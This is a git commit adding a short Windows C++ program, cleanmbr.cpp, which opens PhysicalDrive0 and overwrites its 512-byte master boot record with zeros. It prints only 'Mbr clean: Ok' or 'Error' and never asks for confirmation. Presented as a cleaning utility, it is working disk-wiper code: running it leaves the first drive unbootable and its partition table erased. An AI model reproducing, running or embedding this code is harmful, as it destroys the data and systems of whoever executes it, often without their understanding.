398063119b63c87e6e7de3d04a4478f998003498
eugenik2 <81380388+eugenik2@users.noreply.github.com>
2021-04-27 21:07:49 +0300

    first release

---
+++ cleanmbr/cleanmbr/cleanmbr.cpp
@@ -0,0 +1,44 @@
+﻿#include <fstream>
+#include <windows.h>
+#include <iostream>
+
+using namespace std;
+
+#define MBR_SIZE 512
+int main()
+{
+	DWORD write;
+
+	char mbr[MBR_SIZE];
+
+	ZeroMemory(&mbr, (sizeof mbr));
+
+	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
+			GENERIC_ALL,
+			FILE_SHARE_READ | FILE_SHARE_WRITE,
+			NULL,
+			OPEN_EXISTING,
+			NULL,
+			NULL);
+	if (WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL) == TRUE)
+	{
+		cout << "Mbr clean: Ok" << endl;
+
+		Sleep(3000);
+
+		ExitProcess(0);
+
+	}
+	else
+	{
+		cout << "Mbr clean: Error" << endl;
+
+		Sleep(3000);
+
+		ExitProcess(0);
+		
+	}
+	CloseHandle(MasterBootRecord);
+
+	return 0;
+}
